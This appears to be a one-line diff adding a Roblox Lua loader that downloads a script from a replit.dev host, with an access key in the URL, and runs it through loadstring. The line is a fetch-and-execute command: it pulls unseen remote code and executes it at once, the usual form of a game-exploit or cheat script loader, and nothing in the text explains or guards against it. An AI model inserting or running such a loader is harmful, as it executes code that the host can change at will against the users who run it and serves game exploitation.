@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://efdd33e7-a525-4133-8e91-ef557e467c2c-00-oax5hc6blw7i.kirk.replit.dev/load?key=UCHIWA-OMT34332"))()
